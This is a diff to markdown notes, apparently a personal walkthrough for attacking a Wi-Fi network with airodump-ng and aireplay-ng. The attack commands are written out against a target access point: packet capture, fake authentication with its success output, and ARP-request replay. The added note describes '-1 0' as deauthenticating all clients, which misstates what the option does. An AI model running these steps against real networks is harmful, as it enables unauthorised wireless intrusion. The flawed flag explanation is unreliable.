@@ -12,7 +12,14 @@
 ##### run airodump-ng
 1. `airodump-ng wlan0`  
 2. `airodump-ng --channel 1 --bssid 12:34:45:45:67:80 --write dump.pca wlan0`  
-3. `sudo aireplay-ng -1 0 -e <target_essid> -a 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>`  its either no mac filtering or mac filtering  
+3. `sudo aireplay-ng -1 0 -e <target_essid> -a 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>` -1... '0' deauthenticates all clients. -e... ESSID of target access point. -a... MAC address of target access point. -h... MAC address of your choice. its either no mac filtering or mac filtering  
+Mac filtering is turned off  
+```
+18:22:32 Sending Authentication Request
+18:22:32 Authentication successful
+18:22:32 Sending Association Request
+18:22:32 Association successful :-)
+```
 ##### No MAC filtering  
 --- `sudo aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>`  -3... Standard ARP-request replay. -b... MAC address of target access point. -h... MAC address of your choice.  
 ##### MAC filtering 
